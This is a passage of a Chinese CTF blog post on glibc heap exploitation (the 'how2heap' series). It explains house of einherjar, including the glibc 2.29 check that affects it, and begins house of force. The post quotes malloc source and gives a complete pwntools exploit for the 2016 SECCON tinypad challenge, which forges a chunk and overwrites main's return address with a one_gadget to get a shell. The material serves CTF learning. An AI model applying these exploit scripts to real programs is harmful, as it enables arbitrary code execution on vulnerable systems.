class="toc-number">23.</span> <span class="toc-text">house of some</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-22"><span class="toc-number">23.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-22"><span class="toc-number">23.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-number">23.2.1.</span> <span class="toc-text">任意写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-of-apple2%E5%85%B6%E4%B8%AD%E6%9C%89%E4%B8%80%E6%9D%A1%E9%93%BE%E6%98%AF%E5%A6%82%E4%B8%8B%E8%BF%9B%E8%A1%8C%E7%9A%84"><span class="toc-number">23.2.2.</span> <span class="toc-text">House of apple2其中有一条链是如下进行的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB"><span class="toc-number">23.2.3.</span> <span class="toc-text">任意读</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">23.2.4.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-some2"><span class="toc-number">24.</span> <span class="toc-text">house of some2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-23"><span class="toc-number">24.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-23"><span class="toc-number">24.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%8C%9C%E6%83%B3"><span class="toc-number">24.2.1.</span> <span class="toc-text">第一次猜想</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdx%E7%9A%84%E6%8E%A7%E5%88%B6"><span class="toc-number">24.2.2.</span> <span class="toc-text">rdx的控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0%E8%B5%B7%E7%82%B9"><span class="toc-number">24.2.3.</span> <span class="toc-text">回到起点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E9%AB%98%E6%89%8B%EF%BC%9FCanary"><span class="toc-number">24.2.4.</span> <span class="toc-text">还有高手？Canary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF-1"><span class="toc-number">24.3.</span> <span class="toc-text">模板</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-water"><span class="toc-number">25.</span> <span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-24"><span class="toc-number">25.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-24"><span class="toc-number">25.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#demo"><span class="toc-number">25.2.1.</span> <span class="toc-text">demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-illusion"><span class="toc-number">26.</span> <span class="toc-text">house of illusion</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-25"><span class="toc-number">26.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-25"><span class="toc-number">26.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99-1"><span class="toc-number">26.2.1.</span> <span class="toc-text">任意写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB-1"><span class="toc-number">26.2.2.</span> <span class="toc-text">任意读</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        how2heap
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ixout</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-19T09:34:54.000Z" class="dt-published" itemprop="datePublished">2023-08-19</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/pwn/">pwn</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/heap/" rel="tag">heap</a>, <a class="p-category" href="/tags/how2heap/" rel="tag">how2heap</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（<strong>合并低地址的 chunk</strong>），从而使得尽可能避免碎片化。</p>
<p><strong>利用条件:</strong>off-by-one(可写下一chunk的prev_size与prev_inuse位)</p>
<p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk(要本身可写可控)</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>free函数向低地址chunk合并的操作如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>假设在内存由低到高有A与B两个chunk</p>
<p>且A能够改写B的prev_size与prev_inuse位</p>
<p><strong>unlink的chunk地址由以下代码决定</strong></p>
<p><code>p = chunk_at_offset(p, -((long) prevsize));</code></p>
<p>因为prevsize(<strong>有符号数</strong>)也是可控的</p>
<p>因此只需要在目标地址伪造fakechunk绕过unlink的检查即可</p>
<p><strong>完整性检查</strong>:难以找到存储&amp;A的内存,故选择fakechunk-&gt;fd=fakechunk-&gt;bk=fakechunk</p>
<p><strong>size检查:</strong>通过fakechunk的size字段找到的nextchunk的prev_size字段是否等于fakechunk的size</p>
<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png" alt=""></p>
<p>这样最后就能在unsortedbin中放入一个任意位置的chunk</p>
<p>不过这个chunk的size大概率无法通过unsorted取出时的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>
<p>因此还需要再次写这个chunk的size为一个合适且合法的值</p>
<h2 id="2-29新限制"><a href="#2-29新限制" class="headerlink" title="2.29新限制"></a>2.29新限制</h2><p>2.29向低地址合并操作代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现多了一个检测(通过prevsize找到的chunk的size<strong>?=</strong>prevsize)</p>
<p>这就使得fakechunk的size必须和prevsize相同,而这样的话fakechunk的nextchunk必然还是原本的chunk,这样常常会使得fakechunk的size过大,从而被视作largebin进而会多出一些操作</p>
<p>因此,2.29及以后fakechunk的size字段必须和本chunk的prevsize相同</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 Seccon tinypad</strong></p>
<p>保护pie没开</p>
<p>漏洞有off_by_null</p>
<p>个人第一想法其实是:没开pie且数据段上存放指针—-&gt;可以打unlink</p>
<p>写hook执行system(‘/bin/sh’)或onegadget</p>
<p>exp都快写好了,才发现一个致命的点———-写的时候长度是由strlen定的,malloc_hook默认是null,也就是说就算指向了malloc_hook也写不了</p>
<p>于是只能学习ctfwiki的做法了(其实如果按以上想法做根本就没用到house of einherjar的知识)</p>
<p>思路如下:</p>
<p>常规泄露heap地址,libc地址;并以此得到heap与tinypad的偏移,environ的符号地址,one_gadget等等</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br></pre></td></tr></table></figure>
<p>先申请四个chunk</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
<p>其中chunk2之所以要在尾部写p64(0x11))</p>
<p>是因为chunk2将用以free触发unlink,其后又会检测chunk2下一chunk的prev_inuse状态,写p64(0x11))用于off_by_null将chunk2的size改为0x100后继续维持后续chunk正常被寻找</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br></pre></td></tr></table></figure>
<p>释放chunk1再重新分配以off_by_null写chunk2的size和prev_size</p>
<p>并将fakechunk写在tinypad上,注意绕过unlink检查(自己做的时候这里犯了个蠢,fake_size用偏移offset填充,使得通过size找到的chunk为chunk2,这样是能够绕过部分检查,但offset的大小使得chunk被视作largebin从而unlink多了一部分检查nextsize链,而我又没填充nextsize域)</p>
<p><code>delete(2)</code>删除chunk2触发unlink使得tinypad被联入unsortedbin</p>
<p>此时fakechunk的大小显然不合规</p>
<p>于是</p>
<p><code>edit(4,b&#39;4&#39;*0x20+p64(0)+p64(0x101)+p64(libc.symbols[&#39;__malloc_hook&#39;]+0x10+0x58)*2)</code></p>
<p>将fakechunk的size改为能适中的大小</p>
<p>之后<code>add(0xf0,b&#39;2&#39;*0xd0+p64(666)+p64(environ)+b&#39;a&#39;*8+p64(0x602148))</code>将其申请出来并写memo1和memo2的指针</p>
<p>以此写main的返回地址</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">	p.sendline(<span class="string">b&#x27;Q&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	p.recv()</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line">	tinypad=<span class="number">0x602040</span></span><br><span class="line">	prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">	environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">	one_gadget=libc.address+<span class="number">0x45226</span></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">	fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">	edit(<span class="number">3</span>,fakechunk)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#p.recv()</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	edit(<span class="number">4</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">0x58</span>)*<span class="number">2</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="built_in">print</span>(p.recv())<span class="comment">#too much,可以接收太多遗留信息了,以后函数尽量使用sendlineafter编写</span></span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	<span class="comment">#p.recvall()</span></span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(<span class="number">0xf0</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">666</span>)+p64(environ)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x602148</span>))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;INDEX: 1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	main_ret=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">240</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(main_ret))</span><br><span class="line">	edit(<span class="number">2</span>,p64(main_ret))</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	edit(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">	quit()</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House Of Force 是一种堆利用方法,主要通过修改top_chunk的size足够大使得申请出一个偏移大小的chunk后,top_chunk更新到指向目标地址,当再次申请chunk时得到一个包含目标地址的chunk</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
<li>能够自由地控制堆分配尺寸的大小</li>
</ol>
<p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理,进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p>
<p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p>
<p>glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是前面说的需要一个能够控制 top chunk size 域的漏洞。</p>
<p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成<strong>无符号数</strong>，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证</p>
<p>之后会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p>
<p>与此同时，我们需要注意的是，topchunk 的 size 也会更新</p>
<p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p>
<h3 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h3><p><strong>篡改 <code>malloc@got.plt</code> 实现劫持程序流程</strong></p>
